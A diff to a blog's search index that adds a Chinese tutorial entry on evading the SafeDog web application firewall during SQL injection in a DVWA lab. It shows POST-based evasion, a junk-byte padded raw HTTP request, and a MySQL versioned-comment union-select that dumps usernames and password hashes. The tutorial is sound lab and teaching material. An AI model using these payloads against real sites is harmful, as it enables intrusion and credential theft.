@@ -1,6 +1,73 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>BypassWaf系列一：绕过安全狗的SQL注入</title>
+    <url>/2020/02/06/BypassWaf%E7%B3%BB%E5%88%97%E4%B8%80/</url>
+    <content><![CDATA[<blockquote>
+<p>准备出一个系列课程，分别为<code>SQL</code>注入、命令执行、文件上传、<code>Xss</code>等的<code>Bypass</code>。</p>
+</blockquote>
+<h2 id="什么是Waf"><a href="#什么是Waf" class="headerlink" title="什么是Waf"></a>什么是Waf</h2><p>首先学<code>Bypass Waf</code>，首先要必须知道什么是<code>Waf</code>。</p>
+<p><code>WAF</code>全称<code>Web application firewall</code>，是<code>Web</code>安全防护的一种手段，对攻击者输入的内容进行检测，匹配是否存在恶意内容，如果有放弃这个请求包，或加入黑名单，不允许此<code>IP</code>再次访问网站</p>
+<h3 id="Waf核心功能"><a href="#Waf核心功能" class="headerlink" title="Waf核心功能"></a>Waf核心功能</h3><ul>
+<li>特征匹配<br><code>Waf</code>一般都有自己的匹配规则，多为正则匹配校验内容。</li>
+<li>黑名单、白名单<br>黑名单即拉黑，白名单即只允许</li>
+<li>对数据包处理<br>匹配有攻击特征 -&gt; 丢包 -&gt; 记录 -&gt; 可能拉入<code>IP</code>黑名单</li>
+</ul>
+<h3 id="Waf分类"><a href="#Waf分类" class="headerlink" title="Waf分类"></a>Waf分类</h3><p><code>Waf</code>主要分成三类</p>
+<ul>
+<li>云<code>Waf</code><br>此类<code>Waf</code>是直接部署在云服务器上的，主要实现方式是利用<code>DNS</code>技术，通过移交域名解析权来实现安全防护。用户的请求首先发送到云端节点进行检测(云<code>Waf</code>)，如存在异常请求则进行拦截，否则将请求转发至真实服务器。</li>
+<li>软件<code>Waf</code><br>软件<code>Waf</code>直接安装在需要防护的服务器上，实现方式通常是<code>Waf</code>监听端口或以<code>Web</code>容器扩展方式进行请求检测和阻断。</li>
+<li>硬件<code>Waf</code><br>这类<code>Waf</code>以一个独立的硬件设备的形态存在，以多种方式（如透明桥接模式、旁路模式、反向代理等）部署到网络中为<code>Web</code>应用提供安全防护，这类设备是比较安全的，也比较贵。</li>
+</ul>
+<p>云<code>Waf</code>有一个最直接的绕过办法就是找到目标服务器的真实<code>IP</code>，如此一来，云<code>Waf</code>无权检测内容。</p>
+<h2 id="部署环境"><a href="#部署环境" class="headerlink" title="部署环境"></a>部署环境</h2><ul>
+<li>利用<code>dvwa</code>作为靶场</li>
+<li>利用安全狗作为<code>waf</code></li>
+<li><code>apache</code>中间件</li>
+<li><code>php 5.x</code>版本</li>
+</ul>
+<p><img src="http://static.zybuluo.com/1kbfree/4sb76n42lru5f061xqgx2m9e/image.png" alt="image.png-149.6kB"></p>
+<h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><p>首先我们输入恶意<code>payload</code>后是这样的</p>
+<p><img src="http://static.zybuluo.com/1kbfree/ntjphlpniwp0uozy08v8h8oj/1.png" alt="1.png-66.7kB"></p>
+<h3 id="0x1-利用GET-POST绕过"><a href="#0x1-利用GET-POST绕过" class="headerlink" title="0x1.利用GET+POST绕过"></a>0x1.利用GET+POST绕过</h3><p><img src="http://static.zybuluo.com/1kbfree/gwlkaa3pm87yd3khx96gtbp3/1.png" alt="1.png-200.5kB"></p>
+<h4 id="绕过原理："><a href="#绕过原理：" class="headerlink" title="绕过原理："></a>绕过原理：</h4><p><code>Waf</code>只拦截<code>GET</code>请求，不拦截<code>POST</code>请求，而且程序也接受<code>POST</code>请求，导致<code>POST</code>传入恶意<code>payload</code>后<code>Waf</code>不会拦截</p>
+<p>安全狗默认情况是只检测<code>Url</code>的恶意<code>Payload</code>，然后我们开启一下对<code>POST</code>的检测</p>
+<p><img src="http://static.zybuluo.com/1kbfree/q9kgl0c28zwrt6g318kb4dar/111.png" alt="111.png-80.3kB"></p>
+<p>开启后，这种办法就没办法绕过了</p>
+<p><img src="http://static.zybuluo.com/1kbfree/oejak0wqw25p5vpyvo5el9eu/111.png" alt="111.png-156.8kB"></p>
+<p>那么就要使用第二种办法了</p>
+<h3 id="0x2-垃圾字节数绕过"><a href="#0x2-垃圾字节数绕过" class="headerlink" title="0x2.垃圾字节数绕过"></a>0x2.垃圾字节数绕过</h3><p>这里为了方便查看执行的<code>SQL</code>语句我将其打印出来</p>
+<p><img src="http://static.zybuluo.com/1kbfree/9d274e5k10jak8vofoen863m/1.png" alt="1.png-24kB"></p>
+<p>绕过的请求包如下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;waf&#x2F;dvwa&#x2F;vulnerabilities&#x2F;sqli&#x2F;?Submit&#x3D;Submit&amp;id&#x3D;1 HTTP&#x2F;1.1</span></pre></td></tr><tr><td class="code"><pre><span class="line">Host: 192.168.31.129</span></pre></td></tr><tr><td class="code"><pre><span class="line">Cache-Control: max-age&#x3D;0</span></pre></td></tr><tr><td class="code"><pre><span class="line">Upgrade-Insecure-Requests: 1</span></pre></td></tr><tr><td class="code"><pre><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;65.0.3314.0 Safari&#x2F;537.36 SE 2.X MetaSr 1.0</span></pre></td></tr><tr><td class="code"><pre><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8</span></pre></td></tr><tr><td class="code"><pre><span class="line">Accept-Encoding: gzip, deflate</span></pre></td></tr><tr><td class="code"><pre><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span></pre></td></tr><tr><td class="code"><pre><span class="line">Cookie: security&#x3D;low; PHPSESSID&#x3D;9g1jr0nu47c72napn759d7r8s4</span></pre></td></tr><tr><td class="code"><pre><span class="line">Connection: close</span></pre></td></tr><tr><td class="code"><pre><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span></pre></td></tr><tr><td class="code"><pre><span class="line">Content-Length: 6195</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">Submit&#x3D;Submit&amp;name&#x3D;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck...超多个&amp;id&#x3D;1&#39;+or+&#39;1&#39;&#x3D;&#39;1</span></pre></td></tr></table></figure>
+
+<p><img src="http://static.zybuluo.com/1kbfree/a58kgvpi8l4vit3a01oh1x8y/1.png" alt="1.png-149.2kB"></p>
+<h4 id="绕过原理：-1"><a href="#绕过原理：-1" class="headerlink" title="绕过原理："></a>绕过原理：</h4><p>由于数据包参数很长，<code>Waf</code>会选择不匹配内容，直接把包给程序从而绕过，因为当字节数太长的时候，<code>Waf</code>匹配起来响应的时间很长，影响客户体验。</p>
+<h3 id="0x3-利用SQL语法绕过"><a href="#0x3-利用SQL语法绕过" class="headerlink" title="0x3.利用SQL语法绕过"></a>0x3.利用SQL语法绕过</h3><p>这个就比较难了，对于我这种<code>SQL</code>语句不熟练的人来说是这样，屁话不多说。</p>
+<p>首先试试<code>1&#39;/*!10000or*/&#39;1&#39;=&#39;1</code>是否会拦截</p>
+<p><img src="http://static.zybuluo.com/1kbfree/658u7wq5fsytjuivt4g9r3ss/1.png" alt="1.png-107kB"></p>
+<p>然后用<code>Burp</code>跑一下哪个数字不会拦</p>
+<p><img src="http://static.zybuluo.com/1kbfree/hdonzfyvrmvzums3j65zbfrc/1.png" alt="1.png-132.7kB"></p>
+<p><code>/*!30440*/</code>到<code>/*!30449*/</code>和<code>/*!32440*/</code>到<code>/*!32449*/</code>都不会拦（其实还有很多，但是已经能执行的就足够可以绕过安全狗了），然后尝试查字段内容。</p>
+<p><img src="http://static.zybuluo.com/1kbfree/5vija3he78jg0fu8pdfyq32z/1.png" alt="1.png-179kB"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.31.139&#x2F;waf&#x2F;dvwa&#x2F;vulnerabilities&#x2F;sqli&#x2F;?Submit&#x3D;Submit&amp;name&#x3D;&amp;id&#x3D;1&#39;+&#x2F;*!32441union*&#x2F;+&#x2F;*!32444select*&#x2F;+null,concat_ws(char(32,32,32),user,password)+from+users--+a</span></pre></td></tr></table></figure>
+
+<p>成功。</p>
+<h4 id="绕过原理：-2"><a href="#绕过原理：-2" class="headerlink" title="绕过原理："></a>绕过原理：</h4><p>首先看看如下<code>Sql</code>语句</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select 1&#x2F;*!32222union*&#x2F;select 2;</span></pre></td></tr></table></figure>
+
+<p><img src="http://static.zybuluo.com/1kbfree/iw16y7xh1gy5ft66r0upti5i/1.png" alt="1.png-9.7kB"></p>
+<p><img src="http://static.zybuluo.com/1kbfree/rhzfyh95ete2l4ek52wu3s47/1.png" alt="1.png-8.1kB"></p>
+<p>因为<code>mysql</code>的特性，可以在<code>/*!12345这里*/</code>执行数据库语句，或用<code>/*垃圾字符*/</code>来替换空格，但是安全狗这里使用<code>/**/</code>替换空格的办法依旧会拦截。</p>
+]]></content>
+      <categories>
+        <category>兴趣爱好</category>
+      </categories>
+      <tags>
+        <tag>Bypass</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>目标机器不出网上线办法</title>
     <url>/2020/02/03/%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BF%E5%8A%9E%E6%B3%95/</url>
     <content><![CDATA[<h2 id="网络环境"><a href="#网络环境" class="headerlink" title="网络环境"></a>网络环境</h2><p><img src="http://static.zybuluo.com/1kbfree/zkqlgw3w6102uhg85fb6alp6/image_1e03au6485c51kv6f9d1kd1s3f9.png" alt="image_1e03au6485c51kv6f9d1kd1s3f9.png-24.8kB"></p>
